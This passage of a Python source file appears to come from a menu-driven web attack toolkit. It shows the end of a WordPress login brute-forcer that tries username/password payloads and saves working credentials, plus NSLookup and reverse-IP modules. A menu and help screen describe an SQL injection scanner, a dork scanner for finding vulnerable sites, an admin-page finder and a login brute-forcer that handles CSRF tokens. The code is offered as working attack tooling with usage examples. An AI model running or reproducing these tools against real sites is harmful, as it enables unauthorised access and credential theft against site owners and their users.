                if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
                  usrcnt += 1
                  no += 1
                  text = f"{save}\n"
                  temp = open("./.temp/" + filetemp, "a+")
                  temp.writelines(text)
                  temp.close()
                  break

                else:
                  with term.location(x=0, y=21):
                    print(whitespace)
                  with term.location(x=0, y=21):
                    print(f"{success}{BB} Payload: {W}{payload}")
                  print(f"{whitespace}", end='\r')
                  print(
                    f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')

                sleep(0.010)
                count2 += 1

            except KeyboardInterrupt:
              pause = str(
                input(
                  f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
                ))

              if pause == "X" or pause == "x":
                if os.path.exists("./.temp/" + filetemp):
                  c = open("./.temp/" + filetemp, "r")
                  name = "./output/wpbrute/" + n_url + ".txt"
                  content = c.read()
                  c.close()
                  os.remove("./.temp/" + filetemp)
                  save_file(name, content, 1)
                  main()

                else:
                  if usrcnt > 0:
                    content = f"{save}\n"
                    name = "./output/wpbrute/" + n_url + ".txt"
                    save_file(name, content, 1)
                    main()
                  else:
                    input(f"\n{fail}{BO} Nothing is Saved!")
                    main()

              else:
                text = f"{save}\n"
                temp = open("./.temp/" + filetemp, "a+")
                temp.writelines(text)
                temp.close()
          count1 += 1

      if os.path.exists("./.temp/" + filetemp):
        c = open("./.temp/" + filetemp, "r")
        name = "./output/wpbrute/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
        main()

      input(f"\n{error}{BR} Username & Password Not Found!")
      main()

    else:
      payload = {user_field: user, password_field: passwd}

      req = requests.post(url, data=payload, headers=header)
      if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
        print(
          f"\n{found}{BG} Login User Found!{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{passwd}"
        )

        content = f"{url} | {user} | {passwd}\n"
        name = "./output/wpbrute/" + n_url + ".txt"
        save_file(name, content, 1)
        main()

      else:
        with term.location(x=0, y=21):
          print(whitespace)
        with term.location(x=0, y=21):
          print(f"{success}{BB}Payload: {W}{payload}")
        print(f"{printout}{BO} User: {P}{user}{BO} Pass: {P}{passwd}")
      input(f"\n{error}{BR} Login Incorrect!")
      main()


#NSLookup =====================================
class nslookup():

  def ns_func(self, mode):
    try:
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} NSLookup {W}")
      if (mode == 1):
        filetemp = str(uuid.uuid4())
        types = [
          "A", "AAAA", "AFSDB", "ALIAS", "ATMA", "CAA", "CERT", "CNAME",
          "DHCID", "DNAME", "DNSKEY", "DS", "HINFO", "ISDN", "LOC",
          "MB, MG, MINFO, MR", "MX", "NAPTR", "NS", "NSAP", "NSEC", "NSEC3",
          "NSEC3PARAM", "PTR", "RP", "RRSIG", "RT", "SOA", "SRV", "TLSA",
          "TXT", "X25"
        ]
        f_url = str(input(f" └─[{BO}Url{W}]{P} "))

        if "http://" in f_url or "https://" in f_url:
          url = urlparse(f_url).hostname
          n_url = url
          url = str(url)
        else:
          url = f_url
          n_url = url

        checkConnection("http://" + n_url, 1)

        for type in types:
          command = "nslookup -type=" + type + " " + url
          process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
          output, error = process.communicate()
          if (error):
            print(error)
          print(success + BG + " Types: " + type + "\n" + O +
                output.decode("utf=8"))
          time.sleep(0.05)

          text = "Types: {}\n{}\n".format(type, output.decode("utf=8"))
          temp = open("./.temp/" + filetemp, "a+")
          temp.writelines(text)
          temp.close()

        if os.path.exists("./.temp/" + filetemp):
          removeDups(filetemp)
          c = open("./.temp/" + filetemp, "r")
          name = "./output/nslookup/" + n_url + ".txt"
          content = c.read()
          c.close()
          os.remove("./.temp/" + filetemp)
          save_file(name, content, 1)
        else:
          input(f"\n{fail}{BO} Nothing is Saved!")
          main()
        main()

      elif (mode == 2):
        filetemp = str(uuid.uuid4())
        print(f" ├─[{PINK}Path e.g: lists.txt{W}]")
        print(f"{W} │")
        path = str(input(f" └─[{BO}Path{W}]{P} "))
        if not os.path.exists(path):
          input(f"{error}{BR} File Does Not Exists!")
          self.ns_func(mode)

        with open(path, 'r') as f:
          nslists = f.read().splitlines()
        print("\n")
        for nslist in nslists:

          types = [
            "A", "AAAA", "AFSDB", "ALIAS", "ATMA", "CAA", "CERT", "CNAME",
            "DHCID", "DNAME", "DNSKEY", "DS", "HINFO", "ISDN", "LOC",
            "MB, MG, MINFO, MR", "MX", "NAPTR", "NS", "NSAP", "NSEC", "NSEC3",
            "NSEC3PARAM", "PTR", "RP", "RRSIG", "RT", "SOA", "SRV", "TLSA",
            "TXT", "X25"
          ]
          f_url = nslist
          if "http://" in f_url or "https://" in f_url:
            url = urlparse(f_url).hostname
            n_url = url
            url = str(url)
          else:
            url = f_url
            n_url = url

          checkConnection("http://" + n_url, 0)

          for type in types:
            command = "nslookup -type=" + type + " " + url
            process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
            output, error = process.communicate()
            if (error):
              print(error)

            print(success + BG + " Types: " + type + "\n" + O +
                  output.decode("utf=8"))
            time.sleep(0.05)

            text = "Types: {}\n{}\n".format(type, output.decode("utf=8"))
            temp = open("./.temp/" + filetemp, "a+")
            temp.writelines(text)
            temp.close()

          if os.path.exists("./.temp/" + filetemp):
            removeDups(filetemp)
            c = open("./.temp/" + filetemp, "r")
            name = "./output/nslookup/" + n_url + ".txt"
            content = c.read()
            c.close()
            os.remove("./.temp/" + filetemp)
            save_file(name, content, 2)
            time.sleep(3)
          else:
            input(f"\n{fail}{BO} Nothing is Saved!")
            main()
        main()
    except KeyboardInterrupt:
      cancel()


#Reverse IP Lookup =====================================
class REVIP():

  def __init__(self, ):
    try:
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Reverse IP Lookup {W}")
      print(
        f" ├─[{PINK}Required -dom = Domain, -ip = IP Address, -f = File{W}]")
      print(f"{W} │")
      inpt = input(f" └─[{BO}Target{W}]{P} ")

      if "-dom" in inpt:
        inpts = inpt.replace("-dom", "")
        inpt = inpts.replace(" ", "")

        if "http://" in inpt or "https://" in inpt or "/" in inpt:
          dom = urlparse(inpt).hostname
          dom = str(dom)
        else:
          dom = inpt

        self.main(1, dom)

      elif "-ip" in inpt:
        inpts = inpt.replace("-ip", "")
        inpt = inpts.replace(" ", "")

        self.main(2, inpt)

      elif "-f" in inpt:
        inpts = inpt.replace("-f", "")
        inpt = inpts.replace(" ", "")
        if not os.path.exists(inpt):
          input(f"{error}{BR} File Does Not Exists!")
          REVIP()

        self.main(3, inpt)

      else:
        input(invalid)
        REVIP()

    except KeyboardInterrupt:
      cancel()

  def main(self, mode, inpt):
    inp = inpt

    if mode == 1:
      n_url = inp
      dom = inp
      checkConnection("http://" + n_url, 1)

      self.reverseIPlookup(dom, n_url)

    elif mode == 2:
      ip = inp
      n_url = inp
      checkConnection("http://" + ip, 1)
      if ipCategorizer(ip):
        if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
          if ipCategorizer(ip)[0] == 1:
            self.reverseIPlookup(ip, n_url)
        else:
          input(f"{error}{R} Private IP/IP range detected")

    elif mode == 3:
      ip_file = inp
      try:
        ip_file = open(ip_file, 'rb').readlines()
        for ip in ip_file:

          if "http://" in ip or "https://" in ip or "/" in ip:
            ip = urlparse(ip).hostname
          else:
            pass

          n_url = ip

          ip = ip.decode('utf-8').rstrip()
          checkConnection("http://" + ip, 1)
          if ipCategorizer(ip):
            if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
              if ipCategorizer(ip)[0] == 1:
                self.reverseIPlookup(ip, n_url)
              else:
                for ip in list(
                    str(i) for i in ipaddress.ip_network(ip).hosts()):
                  self.reverseIPlookup(ip, n_url)
            else:
              input(error + R +
                    " Private IP/IP range ({}) detected".format(ip))

      except IOError as e:
        input(error + R + str(e).split("] ")[1])
        REVIP()

  def reverseIPlookup(self, ip, n_url):
    filetemp = str(uuid.uuid4())
    print('\r' + loading + BO + "Searching a record for " + BB + ip + ' ' * 10,
          end='\r')
    url = "https://api.hackertarget.com/reverseiplookup/?q=" + ip
    try:
      req = requests.get(url)
      if "No DNS" not in req.text:
        print('\r' + success + BG + "Found a record for " + ip + ' ' * 20)
        for i in re.split('\n', req.text):
          if ip not in i and i.strip():
            print(success + BB + i)
            text = "{}\n".format(i)
            temp = open("./.temp/" + filetemp, "a+")
            temp.writelines(text)
            temp.close()

      if os.path.exists("./.temp/" + filetemp):
        removeDups(filetemp)
        c = open("./.temp/" + filetemp, "r")
        name = "./output/revIP/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
      else:
        input(f"\n{fail}{BO} Nothing is Saved!")
        main()
      main()

    except requests.exceptions.RequestException as e:
      input(
        f"{error}{BR} Something going wrong with the connection.Please check the connectivity"
      )
    except KeyboardInterrupt:
      if os.path.exists("./.temp/" + filetemp):
        removeDups(filetemp)
        c = open("./.temp/" + filetemp, "r")
        name = "./output/revIP/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
      else:
        input(f"\n{fail}{BO} Nothing is Saved!")
        main()
      main()


# Select Mode =====================================
class mode():

  def slc(self, tools, name):
    try:
      mode_banner = f"""{W}[{BR}@{W}]{BG} {name}{W}
 ╿
 ├┬─[{BR}1{W}]{BO} Single Target {W}
 │├─[{BR}2{W}]{BO} Multi Target {W}
 │└─[{BR}0{W}]{BO} Back {W}
 │"""

      os.system(clrcmd)
      print(banner)
      print(mode_banner)

      md = str(input(f" └─[{BR}~>{W}]{P} "))
      if (md == '1' or md == '01'):
        os.system(clrcmd)
        if tools == 1:
          sqlscan().main(1)
        elif tools == 2:
          crawler().crawl_func(1)
        elif tools == 3:
          nslookup().ns_func(1)

      elif (md == '2' or md == '02'):
        os.system(clrcmd)
        if tools == 1:
          sqlscan().main(2)
        elif tools == 2:
          crawler().crawl_func(2)
        elif tools == 3:
          nslookup().ns_func(2)

      elif (md == '0' or md == '00'):
        main()

      else:
        input(invalid)
        self.slc(tools, name)

    except KeyboardInterrupt:
      cancel()


# Main Menu =====================================
def main():
  try:
    time_stamp = time.time()
    date_time = datetime.fromtimestamp(time_stamp)
    str_date_time = date_time.strftime(BO + "%d-%m-%Y " + W + "|" + BG +
                                       " %H:%M:%S")
    ip_hostname = socket.gethostname()
    ip_address = socket.gethostbyname(ip_hostname)
    os.system(clrcmd)

    menu_banner = f"""{W} ╿
 ├┬─[{BR}1{W}]{BO} SQLI Scanner      {W}┬[{BR}${W}]{P} Scanner Tools{W}
 │├─[{BR}2{W}]{BO} Subdomain Scanner {W}│{W}
 │├─[{BR}3{W}]{BO} Dork Scanner      {W}│{W}
 │├─[{BR}4{W}]{BO} Web Crawler       {W}│{W}
 │├─[{BR}5{W}]{BO} Admin Finder      {W}┘{W}
 │├─[{BR}6{W}]{BO} Login Brute       {W}┬[{BR}${W}]{P} Brute Force Tools{W}
 │├─[{BR}7{W}]{BO} WordPress Crack   {W}┘{W}
 │├─[{BR}8{W}]{BO} NSLookup          {W}┬[{BR}${W}]{P} Network Tools{W}
 │├─[{BR}9{W}]{BO} Reverse IP        {W}┘{W}
 │├─[{BR}?{W}]{BO} Help              {W}┬[{BR}${W}]{P} Other{W}
 │└─[{BR}x{W}]{BO} Exit              {W}┘{W}
 │"""

    print(banner)
    print(
      f"{systm}{W}─[{BO}IP{W}:{BG}{ip_address}{W}]─[{BR}{str_date_time}{W}]")
    print(menu_banner)

    while True:
      i = str(input(f" └─[{BR}~>{W}]{P} "))
      if (i == '1' or i == '01'):
        os.system(clrcmd)
        mode().slc(1, "SQLI Scanner")
        break
      elif (i == '2' or i == '02'):
        os.system(clrcmd)
        SUB().main()
        break
      elif (i == '3' or i == '03'):
        os.system(clrcmd)
        dorkscan().main()
        break
      elif (i == '4' or i == '04'):
        os.system(clrcmd)
        mode().slc(2, "Web Crawler")
        break
      elif (i == '5' or i == '05'):
        os.system(clrcmd)
        ADMF().main()
        break
      elif (i == '6' or i == '06'):
        os.system(clrcmd)
        LOG().main()
        break
      elif (i == '7' or i == '07'):
        os.system(clrcmd)
        WP().main()
        break
      elif (i == '8' or i == '08'):
        os.system(clrcmd)
        mode().slc(3, "NSLookup")
        break
      elif (i == '9' or i == '09'):
        os.system(clrcmd)
        REVIP()
        break
      elif (i == '?'):
        os.system(clrcmd)
        helps()
        break
      elif (i == '0' or i == '00' or i == 'x' or i == 'X'):
        exit()
      else:
        input(invalid)
        main()
        continue
  except KeyboardInterrupt:
    exit()


# Help Screen ==========================================
def helps():
  os.system(clrcmd)
  print(banner)
  help_text = f"""
{success}{BG} Usage & How To Use:

{systm}{W}─────────────{BG}[Scanner Tools]{W}──────────────{systm}

{success}{PINK} SQLI Scanner:
    {W}A tool for scanning SQL vulnerabilities in websites automatically.
    It supports scanning websites from a list file in the format of .txt or others.

  {printout}{BO} Usage:
      {B}[Single Target] 
      {WH}Example: 
      url > http://vulnwebsite.net/pages.php?id=1

      {G}[Multi Target] 
      {W}Input a text file containing a list of URLs for scanning, and enter an output file name.

      {WH}Example: 
      path > path/to/file/list.txt or lists.txt
      output > path/to/file/output.txt or output.txt

{success}{PINK} Subdomain Scanner:
    {W}A tool for scanning subdomains that are hidden or not publicly visible to search engines.

  {printout}{BO} Usage:
      {WH}Example: 
      url > http://www.website.net

{success}{PINK} Dork Scanner:
    {W}A tool for scanning dorks using inurl, intext, intitle, and others.
    This tool can also scan for dorks that contain SQL vulnerabilities, detect URLs that contain admin login, and allows for the setting of a custom proxy for searching dorks.

  {printout}{BO} Usage:
      {B}To scan for SQL vulnerabilities:
      add {P}-s {B}in the dork input.

      {WH}Example: (Sql vuln not scanned)
      dork > inurl:view.php?id=

      Example: (Sql vuln scanned)
      dork > inurl:view.php?id= -s

      Example: (Search admin login)
      dork > inurl:adminlogin.php

      Example: (Add custom proxy)
      proxy > 127.0.0.1:1337

{success}{PINK} Web Crawler:
    {W}A tool for scanning and crawling URLs within a specific website.
    Supports scanning websites in a list file (txt or other) and can detect URLs that contain an admin login page.

  {printout}{BO} Usage:
      {B}[Single Target] 
      {WH}Example: 
      url > http://webhost.com

      {G}[Multi Target] 
      {W}Input your list text file that contains URLs for scanning.

      {WH}Example: 
      path > path/to/file/list.txt or lists.txt

{success}{PINK} Admin Finder:
    {W}A tool similar to a subdomain scanner but designed for scanning admin login pages that are hidden or not publicly accessible by the website owner.

  {printout}{BO} Usage:
      {WH}Example: 
      url > http://sitehost.com


{systm}{W}───────────{BG}[Brute Force Tools]{W}────────────{systm}

{success}{PINK} Login Brute:
    {W}This is a Brute Force Login Tool. You can use it to brute force login websites, even those that use a CSRF token.
    You have the option to choose a custom password wordlist or use the default wordlist located at (src/passwords.txt).

  {error} This tool requires specific {P}<'action'> attribute information, such as the URL for the login form's check_login.php, as well as the <'name'> attributes for the username, password, and csrf token fields.
  {W}These can be found by using the browser's inspect element tool.

  {printout}{BO} Usage:
      {B}To enable CSRF mode, add the option {P}-csrf {B}to the input.
      
      {WH}Example: (Without CSRF Token)
      target > http://site.com/login/userlogin.php
      username > admin
      wordlist > src/passwords.txt
      user field > uname
      pass field > upass

      {WH}Example: (With CSRF Token)
      target > http://site.com/login/ -csrf
      username > admin
      wordlist > src/passwords.txt
      user field > uname
      pass field > upass
      csrf token > csrf

{success}{PINK} WordPress Crack:
    {W}This tool is for brute-forcing WordPress login pages.
    You have the option to select a username/password wordlist or use the default one [src/passwords.txt].

  {printout}{BO} Usage:

      {WH}Example: 
      target > http://localhost.wordpress/wp-login.php
      username > admin or path/to/file/list.txt
      wordlist > password or path/to/file/list.txt (leave blank for default password in ./src/passwords.txt)


{systm}{W}───────────{BG}[Network Tools]{W}────────────{systm}

{success}{PINK} NSLookup:
    {W}This tool is used to scan network information of a website, such as IP address, DNS, and others, with various types of scans.
    It also supports scanning multiple websites using a list file in formats such as .txt.

  {printout}{BO} Usage:
      {B}[Single Target] 
      {WH}Example: 
      url > www.google.com

      {G}[Multi Target] 
      {W}Enter the path to your list file that contains the URLs to be scanned.

      {WH}Example: 
      path > path/to/file/list.txt or lists.txt

{success}{PINK} Reverse IP:
    {W}This tool scans records of websites linked to a specific website.
    It also supports scanning multiple websites using a list file in formats such as .txt.

  {printout}{BO} Usage:
      {B}This tool requires a type selection.
      You can choose between {P}-dom {B} for domain type,
      {P}-ip {B} for IP address type, or {P}-file {B}
      if you want to use a list file such as a .txt file.
      
      {WH}Example: (Domain Type)
      ~> www.google.com -dom

      {WH}Example: (IP Address Type)
      ~> 192.168.1.1 -ip

      {WH}Example: (List File Type)
      ~> path/to/file/list.txt or lists.txt -file


{systm}{W}─────────────────────────────────────────────{systm}
{PINK}              Press Enter To Go Back\033[38;5;232m"""
  input(help_text)
  print(W)
  main()


# Other ==========================================
def cancel():
  sys.stdout.write("\n\r" + whitespace)
  sys.stdout.write(f"\r{W}[{BR}\\{W}] {BO}Back{W} To Menu [{BR}3{W}]")
  time.sleep(0.7)
  sys.stdout.write(f"\r[{BR}|{W}] Back{BO} To{W} Menu [{BR}2{W}]")
  time.sleep(0.7)
  sys.stdout.write(f"\r[{BR}/{W}] Back To{BO} Menu {W}[{BR}1{W}]")
  time.sleep(0.7)

  main()


def exit():
  os.system(clrcmd)
  print(banner)
  print(f"{systm}{BO} See You Again!\n\n")
  sys.exit()


if __name__ == '__main__':
  main()
